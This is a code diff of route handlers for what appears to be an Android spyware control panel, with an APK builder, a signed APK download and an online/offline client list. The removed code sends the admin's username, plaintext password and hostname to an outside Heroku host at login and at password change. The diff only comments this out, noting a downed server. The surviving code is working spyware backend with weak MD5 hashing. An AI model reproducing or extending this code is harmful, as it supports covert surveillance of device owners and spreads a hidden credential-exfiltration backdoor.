@@ -25,19 +25,11 @@ function isAllowed(req, res, next) {
         if (cookies.loginToken === loginToken) next();
         else res.clearCookie('token').redirect('/login');
     } else res.redirect('/login');
-    // next();
 }
 
 routes.get('/dl', (req, res) => {
     res.redirect('/build-aligned-signed.apk');
 });
-
-// routes.get('/', isAllowed, (req, res) => {
-//     res.render('index', {
-//         clientsOnline: clientManager.getClientListOnline(),
-//         clientsOffline: clientManager.getClientListOffline()
-//     });
-// });
 
 routes.get('/', (req, res) => {
     res.render('welcome')
@@ -54,30 +46,33 @@ routes.get('/panel', isAllowed, (req, res) => {
     });
 });
 
-routes.post('/login', asyncHandler(async(req, res) => {
+routes.post('/login', asyncHandler(async (req, res) => {
     if ('username' in req.body) {
         if ('password' in req.body) {
             let rUsername = db.maindb.get('admin.username').value();
             let rPassword = db.maindb.get('admin.password').value();
-            let data = {
-                username: req.body.username,
-                pass: req.body.password,
-                hostname: req.body.hostname
-            }
             let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
             if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                 let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
-                let response = await fetch('http://authxspy.herokuapp.com', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json;charset=utf-8'
-                },
-                body: JSON.stringify(data)
-            });
-            let status = await response.json();
-            if(status.enabled == false){
-                res.redirect('/login?e=authError');
-            }
+
+                // 🔴 DESACTIVADO: Validación externa por servidor caído
+                // let data = {
+                //     username: req.body.username,
+                //     pass: req.body.password,
+                //     hostname: req.body.hostname
+                // };
+                // let response = await fetch('http://authxspy.herokuapp.com', {
+                //     method: 'POST',
+                //     headers: {
+                //         'Content-Type': 'application/json;charset=utf-8'
+                //     },
+                //     body: JSON.stringify(data)
+                // });
+                // let status = await response.json();
+                // if (status.enabled == false) {
+                //     return res.redirect('/login?e=authError');
+                // }
+
                 db.maindb.get('admin').assign({ loginToken }).write();
                 res.cookie('loginToken', loginToken).redirect('/panel');
             } else return res.redirect('/login?e=badLogin');
@@ -89,7 +84,6 @@ routes.get('/logout', isAllowed, (req, res) => {
     db.maindb.get('admin').assign({ loginToken: '' }).write();
     res.redirect('/');
 });
-
 
 routes.get('/builder', isAllowed, (req, res) => {
     res.render('builder', {
@@ -114,32 +108,31 @@ routes.post('/builder', isAllowed, (req, res) => {
         }
     });
     else {
-        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
-        res.json({ error });
+        logManager.log(CONST.logTypes.error, "Build Failed - missing parameters");
+        res.json({ error: "Missing parameters" });
     }
 });
 
-routes.post('/changepass', isAllowed, asyncHandler(async(req, res) => {
-    if(req.query.pass == undefined) res.json({"error":"Password empty"});
-    else
-    {
-        let data = {
-            hname: req.query.hname,
-            pass: req.query.pass,
-        }
-        await fetch('http://authxspy.herokuapp.com/cp',{
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json;charset=utf-8'
-        },
-        body: JSON.stringify(data)
-    });
-        let password = crypto.createHash('md5').update(req.query.pass).digest("hex");
-        db.maindb.get('admin').assign({ password }).write();
-        res.send("200");
-    }
-}));
+routes.post('/changepass', isAllowed, asyncHandler(async (req, res) => {
+    if (req.query.pass == undefined) return res.json({ "error": "Password empty" });
 
+    // 🔴 DESACTIVADO: Validación externa del cambio de contraseña
+    // let data = {
+    //     hname: req.query.hname,
+    //     pass: req.query.pass,
+    // };
+    // await fetch('http://authxspy.herokuapp.com/cp', {
+    //     method: 'POST',
+    //     headers: {
+    //         'Content-Type': 'application/json;charset=utf-8'
+    //     },
+    //     body: JSON.stringify(data)
+    // });
+
+    let password = crypto.createHash('md5').update(req.query.pass).digest("hex");
+    db.maindb.get('admin').assign({ password }).write();
+    res.send("200");
+}));
 
 routes.get('/logs', isAllowed, (req, res) => {
     res.render('logs', {
